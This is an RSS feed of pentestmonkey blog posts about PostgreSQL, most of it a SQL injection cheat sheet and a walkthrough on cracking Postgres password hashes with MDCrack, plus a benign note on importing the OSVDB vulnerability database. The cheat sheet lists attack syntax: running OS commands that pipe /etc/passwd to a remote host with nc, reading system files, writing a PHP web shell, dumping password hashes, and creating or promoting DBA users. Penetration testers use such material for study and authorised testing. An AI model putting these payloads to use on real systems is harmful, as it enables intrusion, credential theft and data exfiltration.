<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>postgresql &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/postgresql/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Fri, 11 Nov 2011 17:35:12 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Update to Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update3</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update3#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 10 Aug 2008 11:39:32 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=60</guid>

					<description><![CDATA[Reiners spotted that I hadn&#8217;t included any info about writing files via SLQ injection in PostgreSQL.  I&#8217;ve update the Postgres Cheat Sheet accordingly.  Thanks Reiners. He&#8217;s also written some detailed blogs about SQL injection in MySQL that are worth reading: MySQL Table and Column Names MySQL Into Outfile &#160;]]></description>
										<content:encoded><![CDATA[<p><a href="http://websec.wordpress.com">Reiners</a> spotted that I hadn&#8217;t included any info about writing files via SLQ injection in PostgreSQL.  I&#8217;ve update the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">Postgres Cheat Sheet </a> accordingly.  Thanks Reiners.</p>
<p>He&#8217;s also written some detailed blogs about SQL injection in MySQL that are worth reading:</p>
<ul>
<li><a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/">MySQL Table and Column Names</a></li>
<li><a href="http://websec.wordpress.com/2007/11/17/mysql-into-outfile/">MySQL Into Outfile</a></li>
</ul>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update3/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Importing OSVDB into a Postgres Database</title>
		<link>https://pentestmonkey.net/blog/osvdb-import</link>
					<comments>https://pentestmonkey.net/blog/osvdb-import#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 03 Feb 2008 15:56:28 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[osvdb]]></category>
		<category><![CDATA[postgresql]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=39</guid>

					<description><![CDATA[I was looking at the Open Source Vulnerbility Database (OSVDB) recently.  If you haven&#8217;t come across it before, it&#8217;s a source vulnerability information, similar to bugtraq or secunia. OSVDB has a good web frontend which is easy to search.  I was investigating if the database could be downloaded and searched offline during onsite pentests when [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I was looking at the <a href="http://osvdb.org/">Open Source Vulnerbility Database</a> (OSVDB) recently.  If you haven&#8217;t come across it before, it&#8217;s a source vulnerability information, similar to <a href="http://www.securityfocus.com/">bugtraq</a> or <a href="http://secunia.com">secunia</a>.</p>
<p>OSVDB has a good web frontend which is easy to search.  I was investigating if the database could be downloaded and searched offline during onsite pentests when no Internet connection is available.</p>
<p>In this post I talk about some of the problems I encountered and how I worked around them.  OSVDB is a fantastic resource and I hope this post helps you get some use out of it.</p>
<p><span id="more-39"></span></p>
<h3>Downloading OSVDB</h3>
<p>Once you agree to the <a href="http://osvdb.org/license">license</a> it&#8217;s possible to download XML dupms of the OSVDB database.  At the time of writing these were about 100 MB when uncompressed and contained information on around 40,000 vulnerabilities.  This should be a valuable asset when you&#8217;re cut off from the Internet.</p>
<h3>Searching your Offline OSVDB</h3>
<p>There are several ways you could go about searching this information.  The ones that occurred to me initially were:</p>
<ul>
<li>Search for an existing solution</li>
<li>&#8220;grep&#8221; the XML file</li>
<li>Write a command-line / web script to search the XML file</li>
<li>Import XML data into a database, then search the database.</li>
</ul>
<p>Surprisingly, I couldn&#8217;t find an existing interface to search OSVDB offline.  I&#8217;m sure they must exist.  <a href="mailto:pentestmonkeyAATTpentestmonkey.net">Let me know</a> if you find one. (Update: see the end of this post).</p>
<p>Grepping the XML file is fast, but making humans read XML is kinda nasty.</p>
<p>I had a brief attempt at writing a command-line tool, but found that PERL&#8217;s XML::Simple module took several minutes to read in the 100 MB XML file &#8211; even before you attempted to do any searching.  I wasn&#8217;t willing to wait several minutes for each query, so skipped this option.</p>
<h3>Importing OSVDB XML file to a SQL database</h3>
<p>The OSVDB website provides <a href="http://osvdb.org/database_info">database schemas</a> for MySQL and PostgreSQL.  There&#8217;s also a brilliant <a href="http://osvdb.org/images/osvdb-schema-large.jpg">diagram</a> of the schema along with a PERL-based <a href="http://osvdb.org/tools#importtools">import script</a> to read the XML and squirt it into your database.</p>
<p>I ran into some problems importing the XML data into my Postgres database.  I&#8217;m sure I&#8217;ve had it working in the past, but this time round I found that the script took up 500MB of memory, ran for 16 hours or so, then produced an error like:</p>
<pre>Insert Vuln.DBD::Pg::st execute failed: ERROR:  invalid input syntax for type timestamp: ""
Error: ERROR:  invalid input syntax for type timestamp: ""</pre>
<p>or:</p>
<pre>Insert Ext Ref Value..........................DBD::Pg::st execute failed: ERROR:  duplicate key violates unique constraint "ext_ref_value_pkey"</pre>
<pre>Error: ERROR:  duplicate key violates unique constraint "ext_ref_value_pkey"</pre>
<p>I also found that incorrect relationships where being created in the &#8220;credit&#8221; table.</p>
<p>I spent a week or so trying to fix the import script and eventually undertook to write a replacement.</p>
<h3>Alternative Import Script for Postgres</h3>
<p>I&#8217;m pretty happy that my replcement script, <a href="http://pentestmonkey.net/tools/osvdb/osvdb-xml-to-postgres.pl">osvdb-xml-to-postgres.pl</a> parses the XML properly and creates the correct relationships in the database.  However, it&#8217;s no faster and uses 2.4GB of RAM.  Oops!  It&#8217;s fairly elegant, but apparently not that efficient.</p>
<p>Here&#8217;s an example of how I ran it:</p>
<p>First I made some minor changes to the schema.  These are explained in the following section.  Download the modified: <a href="http://pentestmonkey.net/tools/osvdb/OSVDB-procedures.sql">OSVDB-procedures.sql</a> , <a href="http://pentestmonkey.net/tools/osvdb/OSVDB-tables.sql">OSVDB-tables.sql</a> and <a href="http://pentestmonkey.net/tools/osvdb/OSVDB-views.sql">OSVDB-views.sql</a>.  Also make sure you&#8217;ve downloaded the <a href="http://osvdb.org/exports">XML file</a> (register first).</p>
<p>Next, create a database then run the import script:</p>
<pre>$ dropdb -U postgres osvdb; createdb -U postgres osvdb; cat OSVDB-tables.sql OSVDB-views.sql OSVDB-procedures.sql | psql -U postgres osvdb; perl osvdb-xml-to-postgres.pl xmlDumpByID-2008-1-18.xml</pre>
<p>If you interrupt the process for some reason, you can resume the import by doing:</p>
<pre>$ osvdb-xml-to-postgres.pl xmlDumpByID-2008-1-18.xml</pre>
<p>Existing entries won&#8217;t be overwritten.</p>
<p>Database connection parameters are hard coded at present.  You might need to edit these in <a href="http://pentestmonkey.net/tools/osvdb/osvdb-xml-to-postgres.pl">osvdb-xml-to-postgres.pl</a>:</p>
<pre>my $dbname = "osvdb";
my $port = 5432;
my $host = "localhost";
my $username = "postgres";
my $password = "";</pre>
<p>I use PERL&#8217;s DBI, so it should be trivial to modify this script to work with MySQL instead of postgres.  I haven&#8217;t tried this, though.</p>
<h3>Modifications to the Database Schema</h3>
<p>The table &#8220;ext_txt&#8221; no longer has an author_id field.  I couldn&#8217;t see how to parse this information from the XML dump.  &#8220;vuln&#8221;s still have authors, but &#8220;external texts&#8221; don&#8217;t.  Views were updated to reflect this change.</p>
<p>I also removed this primary key from the &#8220;author&#8221; table:</p>
<pre>PRIMARY KEY (author_name, author_email)</pre>
<p>The XML dump seems to violate this uniquness contstraint.</p>
<h3>Postgres SQL Dump</h3>
<p>If you don&#8217;t want to run the import don&#8217;t mind using a potentially out-of-data version of OSVDB here&#8217;s a SQL dump (6MB compressed): <a href="http://pentestmonkey.net/tools/osvdb/osvdb-postgres-2008-1-18.sql.bz2">osvdb-postgres-2008-1-18.sql.bz2</a> .</p>
<p>To restore it:</p>
<pre>$ createdb -U postgres osvdb</pre>
<pre>$ psql -U postgres osvdb -c 'create user osvdb'</pre>
<pre>$ bzcat osvdb-postgres-2008-1-18.sql.bz2 | psql -U postgres osvdb</pre>
<p>It&#8217;s a 41MB SQL file, so the import should take a while.</p>
<h3>Searching the Schema</h3>
<p>I haven&#8217;t got round to writing a tool yet!  I&#8217;ll make another post when I get round to this.   (See update at and of this post for SQLite / Ruby on rails tool).</p>
<h3>Legal Stuff</h3>
<p>In order to comply with section 5 of the <a href="http://osvdb.org/license">OSVDB Free License</a> I&#8217;m required to inform you of the following with regard to the SQL schema and SQL dump above:</p>
<p>&#8220;This product includes data from the Open Source Vulnerability Database developed by OSVDB (www.osvdb.org) and its contributors.&#8221;</p>
<p>It&#8217;s also interesting to note that you may need to comply with the <a href="http://osvdb.org/license">license</a> depending on what you want to do with the database.  Section 8 of the license says it best:</p>
<p>&#8220;NON TRANSFERABILITY: This Free License is non-transferable. This means that it applies to you, not to the people you distribute the product to. These people are subject to the same Copyright and MAY OR MAY NOT qualify for their own, free, unregistered license.&#8221;</p>
<h3>UPDATE 2007-02-08</h3>
<p>Not long after I made this post, OSVDB release their database in <a href="http://osvdb.org/file/dumps">CSV, MySQL dump and SQLite format</a> (you need to create an account first).  This is great news for pentesters and other professions who need access to OSVDB offline.  There&#8217;s even an offline tools for browsing the SQLite database called <a href="http://osvdb.org/tools">OSVDB Personal Edition</a> .</p>
<p>OSVDB Personal Edition is a ruby on rails web server which uses a SQLite backend.  It&#8217;s VERY easy to install, has a simple search feature and has none of the performance problems associated with slurping a big XML file into memory.  It&#8217;s meant as a PoC, but it&#8217;s still useful.  Pentesters beware, though: the web server binds to 0.0.0.0 instead of 127.0.0.1which is probably not what you want. <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>Great work OSVDB!  Keep it up.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/osvdb-import/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Updated Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update2</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update2#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Mon, 21 Jan 2008 21:10:41 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=38</guid>

					<description><![CDATA[I just put some finishing touches to the PostgreSQL Injection Cheat Sheet .  All the TODO items have been removed now.  Let me know if you have any extra info you think should be included on the cheat sheet.]]></description>
										<content:encoded><![CDATA[<p>I just put some finishing touches to the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL Injection Cheat Sheet</a> .  All the TODO items have been removed now.  <a href="mailto:pentestmonkeyAATTpentestmonkey.net">Let me know</a> if you have any extra info you think should be included on the cheat sheet.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update2/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:18:37 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=85</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into PostgreSQL databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into PostgreSQL databases&#8230;</p>
<p><span id="more-85"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT version()</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1; &#8211;comment<br />
SELECT /*comment*/1;</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user;<br />
SELECT current_user;<br />
SELECT session_user;<br />
SELECT usename FROM pg_user;<br />
SELECT getpgusername();</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT usename FROM pg_user</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT usename, passwd FROM pg_shadow &#8212; priv</td>
</tr>
<tr>
<td>Password Cracker</td>
<td><a href="http://pentestmonkey.net/blog/cracking-postgres-hashes/">MDCrack</a> can crack PostgreSQL&#8217;s MD5-based passwords.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT current_database()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT datname FROM pg_database</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&#8217;r&#8217;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &#8216;public&#8217;)</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (&#8216;r&#8217;,&#8221;) AND n.nspname NOT IN (&#8216;pg_catalog&#8217;, &#8216;pg_toast&#8217;) AND pg_catalog.pg_table_is_visible(c.oid)</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>If you want to list all the table names that contain a column LIKE &#8216;%password%&#8217;:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&#8217;r&#8217;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &#8216;public&#8217;) AND attname LIKE &#8216;%password%&#8217;;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; &#8212; rows numbered from 0<br />
SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(&#8216;abcd&#8217;, 3, 1); &#8212; returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2; &#8212; returns 2<br />
SELECT 6 &amp; 1; &#8211;returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT chr(65);</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;);</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(1 as varchar);<br />
SELECT CAST(&#8216;1&#8217; as int);</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; || &#8216;B&#8217;; &#8212; returnsAB</td>
</tr>
<tr>
<td>If Statement</td>
<td>IF statements only seem valid inside functions, so aren&#8217;t much use for SQL injection.  See CASE statement instead.</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN (1=1) THEN &#8216;A&#8217; ELSE &#8216;B&#8217; END; &#8212; returns A</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT CHR(65)||CHR(66); &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>SELECT pg_sleep(10); &#8212; postgres 8.2+ only<br />
CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS &#8216;/lib/libc.so.6&#8217;, &#8216;sleep&#8217; language &#8216;C&#8217; STRICT; SELECT sleep(10); &#8211;priv, create your own sleep function.  Taken from <a href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">here</a> .</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>Generally not possible in postgres.  However if <a href="http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html">contrib/dblink</a>is installed (it isn&#8217;t by default) it can be used to resolve hostnames (assuming you have DBA rights):</p>
<pre>SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);</pre>
<p>Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. &#8220;ping pentestmonkey.net&#8221;.</td>
</tr>
<tr>
<td>Command Execution</td>
<td>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS &#8216;/lib/libc.so.6&#8217;, &#8216;system&#8217; LANGUAGE &#8216;C&#8217; STRICT; &#8212; privSELECT system(&#8216;cat /etc/passwd | nc 10.0.0.1 8080&#8217;); &#8212; priv, commands run as postgres/pgsql OS-level user</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata(t text);<br />
COPY mydata FROM &#8216;/etc/passwd&#8217;; &#8212; priv, can read files which are readable by postgres OS-level user<br />
&#8230;&#8217; UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; &#8212; get data back one row at a time<br />
&#8230;&#8217; UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; &#8212; get data back one row at a time &#8230;<br />
DROP TABLE mytest mytest;Write to a file:</p>
<p>CREATE TABLE mytable (mycol text);<br />
INSERT INTO mytable(mycol) VALUES (&#8216;&lt;? pasthru($_GET[cmd]); ?&gt;&#8217;);<br />
COPY mytable (mycol) TO &#8216;/tmp/test.php&#8217;; &#8211;priv, write files as postgres OS-level user.  Generally you won&#8217;t be able to write to the web root, but it&#8217;s always work a try.<br />
&#8212; priv user can also read/write files by <a href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">mapping libc functions</a></td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT inet_server_addr(); &#8212; returns db server IP address (or null if using local connection)<br />
SELECT inet_server_port(); &#8212; returns db server IP address (or null if using local connection)</td>
</tr>
<tr>
<td>Create Users</td>
<td>CREATE USER test1 PASSWORD &#8216;pass1&#8217;; &#8212; priv<br />
CREATE USER test1 PASSWORD &#8216;pass1&#8217; CREATEUSER; &#8212; priv, grant some privs at the same time</td>
</tr>
<tr>
<td>Drop Users</td>
<td>DROP USER test1; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>ALTER USER test1 CREATEUSER CREATEDB; &#8212; priv</td>
</tr>
<tr>
<td> Location of DB files</td>
<td>SELECT current_setting(&#8216;data_directory&#8217;); &#8212; priv<br />
SELECT current_setting(&#8216;hba_file&#8217;); &#8212; priv</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>template0<br />
template1</td>
</tr>
</tbody>
</table>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Cracking Postgres Password Hashes with MDCrack</title>
		<link>https://pentestmonkey.net/blog/cracking-postgres-hashes</link>
					<comments>https://pentestmonkey.net/blog/cracking-postgres-hashes#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 24 Jun 2007 20:50:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[mdcrack]]></category>
		<category><![CDATA[passwordcracking]]></category>
		<category><![CDATA[postgresql]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=15</guid>

					<description><![CDATA[As far as I&#8217;m aware there are aren&#8217;t many good password crackers around for PostgreSQL database password hashes.  Here are a few notes on how to crack postgres password hashes quickly using MDCrack.  Even though MDCrack is a Windows program, it works well enough under WINE for our purposes.  Linux users can therefore benefit from [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>As far as I&#8217;m aware there are aren&#8217;t many good password crackers around for <a href="http://www.postgresql.org/">PostgreSQL</a> database password hashes.  Here are a few notes on how to crack postgres password hashes quickly using MDCrack.  Even though <a href="http://membres.lycos.fr/mdcrack/">MDCrack</a> is a Windows program, it works well enough under <a href="http://www.winehq.org/">WINE</a> for our purposes.  Linux users can therefore benefit from its impressive cracking speeds.</p>
<p><span id="more-15"></span></p>
<h3>Where are the Hashes Kept?</h3>
<p>Postgres keeps MD5-based password hashes for database-level users in the pg_shadow table.  You need to be the database superuser to read this table (usually called &#8220;postgres&#8221; or &#8220;pgsql&#8221;).  First log into the database.  If you&#8217;ve gained local access to the Postgres server (e.g. via SSH), you&#8217;ll probably find that you don&#8217;t need a password to log in.  You will need a username and the name of a database, though.  The database &#8220;template1&#8221; always exists:</p>
<pre>$ psql -U postgres template1</pre>
<p>Then list the hashes:</p>
<pre># select usename, passwd from pg_shadow;
     usename      |  passwd               
------------------+-------------------------------------
 testuser         | md5fabb6d7172aadfda4753bf0507ed4396</pre>
<pre>...</pre>
<p>The passwd field in this table is MD5(password || username) &#8211; where || denotes concatenation.   In this example the passwd field for testuser contains &#8220;md5&#8221; || MD5(m4gictestuser).</p>
<h3>Cracking Hashes</h3>
<p>Download the latest version of <a href="http://membres.lycos.fr/mdcrack/">MDCrack</a>.  If you&#8217;re running Linux, then run it under WINE.  You&#8217;ll need to tell MDCrack to append the username to the end of each candidate password:</p>
<pre>$ wine MDCrack-sse.exe --algorithm=MD5 --append=testuser fabb6d7172aadfda4753bf0507ed4396

System / Starting MDCrack v1.8(3)
System / Running as MDCrack-sse.exe --algorithm=MD5 --append=testuser fabb6d7172aadfda4753bf0507ed4396
System / Charset is: abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
System / Detected processor(s): 2 x unknown | 3D-Now | MMX | SSE | SSE2
System / Target hash: fabb6d7172aadfda4753bf0507ed4396
System / &gt;&gt; Using MD5 cores: maximal candidate/user salt size: 16/54 bytes
Info   / Press ESC for available runtime shortcuts (Ctrl-c to quit)
Info   / Thread #0: &gt;&gt; Using Core 2
Info   / Thread #1: &gt;&gt; Using Core 2
Info   / Thread #0: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  5 ( + user salt: 8 )
----------------------------------------------------------/ Thread #0 (Success) ----
System / Thread #0: Collision found: m4gictestuser
...</pre>
<h3>Performance</h3>
<p>When running under WINE MDCrack can rattle through nearly 20 million passwords per second on a (dual core) AMDx2 4200+.  It automatically utilises both processors.</p>
<pre>$ wine MDCrack-sse.exe --benchmark

System / Starting MDCrack v1.8(3)
System / Running as MDCrack-sse.exe --benchmark
System / Detected processor(s): 2 x 2.15 Ghz unknown | 3D-Now | MMX | SSE | SSE2
Warning/ Please wait, this benchmark should last around 1min 45s
Info   / Press Ctrl-c to skip a test

---------------------------------------------------------------/ MD4 / DH / 2 Threads ---------------------
Info   / Benchmarking ( pass #1 )... 33 178 408 ( 3.32e+007 ) h/s.
---------------------------------------------------------------/ MD5 / DH / 2 Threads ---------------------
Info   / Benchmarking ( pass #1 )... 19 703 399 ( 1.97e+007 ) h/s.
...</pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/cracking-postgres-hashes/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
